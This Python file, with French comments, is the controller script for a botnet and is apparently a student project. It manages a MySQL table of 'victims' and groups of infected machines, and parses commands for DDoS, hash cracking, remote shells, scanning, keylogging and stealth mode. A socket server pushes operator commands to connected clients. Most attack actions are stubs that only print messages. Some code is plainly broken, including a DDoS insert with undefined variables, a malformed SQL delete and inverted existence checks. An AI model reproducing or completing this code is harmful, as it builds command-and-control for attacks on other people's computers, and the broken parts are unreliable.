import socket
from env import *
import threading
import argparse
from queue import Queue
import mysql.connector




# Fonctions



def co(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print("ecoute sur : " + str(host) + ":" + str(port))
        conn, addr = s.accept()
    return conn, addr


def emission(conn, addr):
    while True:
        message = input("Message :")
        conn.sendall(message.encode())
        if message == 'quitter':
            break


def reception(conn, addr):
    print("Connection de :::: ", addr)
    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(f" Client: {data.decode()}")




def group_exists(group_name):
    query = "SELECT * FROM groups WHERE name = %s"
    values = (group_name, )

    mycursor.execute(query, values)
    result = mycursor.fetchall()

    return len(result) > 0


def get_group_id(group_name):
    query = "SELECT id FROM groups WHERE name = %s"
    values = (group_name, )

    mycursor.execute(query, values)
    result = mycursor.fetchall()

    if len(result) < 1:
        return None
    else:
        return result[0][0]


# Fin fonctions



# Arguments
# -h, --help            montre le message d'aide
# -a, --action          permet de sélectionner une action (ex: "ddos", "scan", "shell", "endpoint", "keylogger", "screenshot", "decrypt", "download", "crypto")
# -s, --stop            permet de stopper l'action en cours
# -g, --group           permet de sélectionner un groupe d'ordinateur. Pour séléctionner plusieurs groupes, il faut les séparer par des virgules (ex: "ESGI,PARIS")
# -h, --host            permet de sélectionner un ordinateur. Pour séléctionner plusieurs hosts, il faut les séparer par des virgules (ex: "10.10.10.10,12.12.12.12")
# -lg, --list-group     montre la liste des groupes ordinateurs
# -lh, --list-host      montre la liste des ordinateurs
# -cg, --create-group   créer un groupe d'ordinateurs
# -dg, --delete-group   supprime un groupe d'ordinateur

# python3 main.py -g ESGI,PARIS -a ddos 10.11.12.13
# python3 main.py -h 10.10.10.10 -a shell

# python3 main.py -cg ESGI 100.100.100.100,13.13.13.13


parser = argparse.ArgumentParser()

# Groupe mutuellement exclusif pour les attaques
action_group = parser.add_mutually_exclusive_group()

# Démarrage du serveur
action_group.add_argument("--start", action="store_true", help="démarre le serveur")

# Arguments spécifiques à l'attaque DDoS
action_group.add_argument("--ddos", action="store_true", help="lance une attaque ddos sur un ordinateur")

# Arguments spécifiques à l'attaque de crack
action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")

# Lance un shell sur une machine précise
action_group.add_argument("--shell", action="store_true", help="Lance un shell sur une machine précise")

# Lance un VPN sur une machine précise
action_group.add_argument("--endpoint", action="store_true", help="Lance une connexion VPN sur une machine précise")

# Lance un VPN sur une machine précise
action_group.add_argument("--scan", action="store_true", help="Scan le réseau d'une machine précise ou d'un groupe")

# Active/désactive le mode discretion
action_group.add_argument("--stealth", action="store_true",  help="Active le mode discretion sur une ou plusieurs machines. Limite l'utilisation de l'ordinateur")
action_group.add_argument("--no-stealth", action="store_true",  help="Désactive le mode discretion sur une ou plusieurs machines. Enlève la limite d'utilisation de l'ordinateur")

# Active/désactive le mode multi-task
action_group.add_argument("--multi-task", action="store_true",  help="Active le mode multi-task sur une ou plusieurs machines. Permet de lancer plusieurs taches en même temps")
action_group.add_argument("--no-multi-task", action="store_true",  help="Désactive le mode multi-task sur une ou plusieurs machines. Limite les taches à une seule à la fois")

# Arguments pour les différentes attaques
parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
parser.add_argument("--time", type=int, help="temps de l'attaque ddos en seconde")
parser.add_argument("--hash", type=str, help="hash à cracker")
parser.add_argument("--wordlist", type=str, help="wordlist")


# Gestion des groupes
action_group.add_argument("--list-host", action="store_true", help="Montre la liste des ordinateurs")
action_group.add_argument("--list-group", type=str, help="Montre la liste des groupes d'ordinateurs")
action_group.add_argument("--create-group", nargs=2, type=str, help="Créer un groupe d'ordinateurs. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--add-to-group", nargs=2, type=str, help="Ajoute des ordinateurs à un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--remove-from-group", nargs=2, type=str, help="Retire des ordinateurs d'un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
action_group.add_argument("--delete-group", type=str, help="Supprime un groupe d'ordinateurs")


# Groupe mutuellement exclusif pour la sélection du groupe ou de l'ordinateur
group_or_host = parser.add_mutually_exclusive_group()
group_or_host.add_argument("-G", "--group", type=str, help="permet de sélectionner un groupe d'ordinateur. Pour sélectionner plusieurs groupes, il faut les séparer par des virgules (ex: 'ESGI,PARIS')")
group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionner un ordinateur. Pour sélectionner plusieurs hosts, il faut les séparer par des virgules")


args = parser.parse_args()




# Database
db = mysql.connector.connect(
    host=DBHOST,
    user=DBUSER,
    password=DBPASSWORD,
    database=DB
)


mycursor = db.cursor()



if args.ddos:
    if not args.address or not args.time:
        parser.error("--ddos nécessite les arguments --address et --time")
    elif not args.host and not args.group:
        parser.error("--ddos nécessite l'argument --host et/ou --group")

    print("ddos sur " + args.address + " pendant " + args.time + " secondes")

    # Parsing des attaquants
    for group in args.group.split(","):
        query = "SELECT * FROM groups WHERE name = %s"
        values = (group,)
        mycursor.execute(query, values)
        result = mycursor.fetchall()
        print(result)

    # Récupération de l'id du groupe
    query = "SELECT id FROM groups WHERE name = %s"
    values = (args.group,)


    # Ajout de l'attaque en bdd
    query = "INSERT INTO group_attacks (group_id, type, state, text) VALUES (%s, %s, %s, %s)"
    values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)

    mycursor.execute(query, values)


elif args.crack:
    if not args.hash or not args.wordlist:
        parser.error("--crack nécessite les arguments --hash et --wordlist")
    elif not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host et/ou --group")

    print("crack du hash '" + args.hash + "' avec la wordlist " + args.wordlist)


elif args.shell:
    if args.group:
        parser.error("--shell n'accepte pas l'argument --group")
    elif not args.host:
        parser.error("--shell nécessite l'argument --host")
    print("shell sur " + args.host)


elif args.endpoint:
    if args.group:
        parser.error("--endpoint n'accepte pas l'argument --group")
    elif not args.host:
        parser.error("--endpoint nécessite l'argument --host")
    print("connexion VPN sur " + args.host)


elif args.scan:
    if not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host et/ou --group")
    print("scan sur " + args.host + " et/ou " + args.group)


elif args.stealth:
    if not args.host and not args.group:
        parser.error("--stealth nécessite l'argument --host et/ou --group")
    elif args.no_stealth:
        parser.error("--stealth et --no-stealth sont mutuellement exclusifs")
    print("activation du mode stealth sur " + args.host + " et/ou " + args.group)


elif args.no_stealth:
    if not args.host and not args.group:
        parser.error("--no-stealth nécessite l'argument --host et/ou --group")
    elif args.stealth:
        parser.error("--no-stealth et --stealth sont mutuellement exclusifs")
    print("désactivation du mode stealth sur " + args.host + " et/ou " + args.group)


elif args.multi_task:
    if not args.host and not args.group:
        parser.error("--multi-task nécessite l'argument --host et/ou --group")
    elif args.no_multi_task:
        parser.error("--multi-task et --no-multi-task sont mutuellement exclusifs")
    print("activation du mode multi-task sur " + args.host + " et/ou " + args.group)


elif args.no_multi_task:
    if not args.host and not args.group:
        parser.error("--no-multi-task nécessite l'argument --host et/ou --group")
    elif args.multi_task:
        parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
        
    else:
        print("désactivation du mode multi-task sur " + args.host + " et/ou " + args.group)



elif args.list_host:
    if args.host:
        parser.error("--list-host n'accepte pas l'argument --host")

    elif args.group:
        print("liste des ordinateurs du groupe " + args.group)

        group_name = args.create_group[0]


        # Vérification de l'existence du groupe
        if group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        # Récupération des ordinateurs du groupe
        query = "SELECT uid, ip FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
        values = (group_name, )

        mycursor.execute(query, values)

        result = mycursor.fetchall()
        nb_victims = len(result)

        print("Il y a " + str(nb_victims) + " ordinateurs dans le groupe " + group_name)
        for victim in result:
            print(victim[0] + " - " + victim[1])


    else:
        print("liste des ordinateurs du botnet")

        # Récupération des ordinateurs
        query = "SELECT uid, ip FROM victims"

        mycursor.execute(query)

        result = mycursor.fetchall()
        nb_victims = len(result)

        print("Il y a " + str(nb_victims) + " ordinateurs dans le botnet")
        for victim in result:
            print(victim[0] + " - " + victim[1])



elif args.list_group:
    if args.host or args.group:
        parser.error("--list-group n'accepte pas les arguments --host et --group")
    else:
        print("liste des groupes d'ordinateurs")

        group_name = args.create_group[0]


        # Vérification de l'existence du groupe
        if group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)


        # Récupération des groupe
        query = "SELECT name FROM groups"

        mycursor.execute(query)

        result = mycursor.fetchall()
        nb_groups = len(result)

        print("Il y a " + str(nb_groups) + " groupes")
        for group in result:
            print(group[0])



elif args.create_group:
    if args.host or args.group:
        parser.error("--create-group n'accepte pas les arguments --host et --group")

    else:
        print("création du groupe " + args.create_group[0] + " avec les ordinateurs " + args.create_group[1])

        group_name = args.create_group[0]


        # Vérification de l'existence du groupe
        if group_exists(group_name):
            print("Le groupe existe déjà")
            exit(1)


        # Création du groupe
        query = "INSERT INTO groups (name, image, created_at, updated_at) VALUES (%s, 'default.png', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
        values = (group_name, )

        mycursor.execute(query, values)


        # Récupération des ordinateurs à ajouter au groupe
        victims_list = []

        for victim in args.create_group[1].split(","):
            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
            values = (victim, victim, victim)

            mycursor.execute(query, values)
            result = mycursor.fetchall()

            for id in result:
                victims_list.append(id[0])


        # Ajout des ordinateurs au groupe
        for victim_id in victims_list:
            query = "INSERT INTO victim_groups (group_id, victim_id) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
            values = (group_name, victim_id)

            mycursor.execute(query, values)



elif args.add_to_group:
    if args.host or args.group:
        parser.error("--add-to-group n'accepte pas les arguments --host et --group")

    else:
        print("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])

        group_name = args.add_to_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)
        else:
            # Récupération des ordinateurs à ajouter au groupe
            victims_list = []

            for victim in args.add_to_group[1].split(","):
                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                values = (victim, victim, victim)

                mycursor.execute(query, values)
                result = mycursor.fetchall()

                for id in result:
                    victims_list.append(id[0])


            # Ajout des ordinateurs au groupe
            for victim_id in victims_list:
                query = "INSERT INTO victim_groups (group_id, victim_id, created_ad, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                values = (group_name, victim_id)

                mycursor.execute(query, values)

            

elif args.remove_from_group:
    if args.host or args.group:
        parser.error("--remove-from-group n'accepte pas les arguments --host et --group")

    else:
        print("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])

        group_name = args.remove_from_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        else:
            # Récupération des ordinateurs à retirer au groupe
            victims_list = []

            for victim in args.remove_from_group[1].split(","):
                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
                values = (victim, victim, victim)

                mycursor.execute(query, values)
                result = mycursor.fetchall()

                for id in result:
                    victims_list.append(id[0])


            # Retrait des ordinateurs au groupe
            for victim_id in victims_list:
                query = "DELETE FROM victim_groups WHERE victim_id = %s)"
                values = (victim_id)

                mycursor.execute(query, values)



elif args.delete_group:
    if args.host or args.group:
        parser.error("--delete-group n'accepte pas les arguments --host et --group")

    else:
        print("suppression du groupe " + args.delete_group)

        group_name = args.delete_group[0]

        # Vérification de l'existence du groupe
        if not group_exists(group_name):
            print("Le groupe n'existe pas")
            exit(1)

        else:
            # Récupération de l'id du group à supprimer
            group_id = get_group_id(group_name)

            # Suppression du lien victim/group du groupe à supprimer
            query = "DELETE FROM victim_groups WHERE group_id = %s"
            values = (group_id, )

            mycursor.execute(query, values)

            # Suppression du fichier image si ce n'est pas default.png

            ######## à faire

            # Suppression du groupe
            query = "DELETE FROM groups WHERE id = %s"
            values = (group_id, )

            mycursor.execute(query, values)



elif args.start:
    if not args.port or args.port < 1023 or args.port > 65535:
        parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
    else:
        print("démarrage du serveur sur le port " + str(args.port))


        running = True

        while running:
            # Création de la connexion
            conn, addr = co("127.0.0.1", args.port)

            thread_emission = threading.Thread(target=emission, args=(conn, addr))
            thread_reception = threading.Thread(target=reception, args=(conn, addr))

            thread_emission.start()
            thread_reception.start()

























































else :
    parser.error("no action specified. Use -h/--help for help")

db.commit()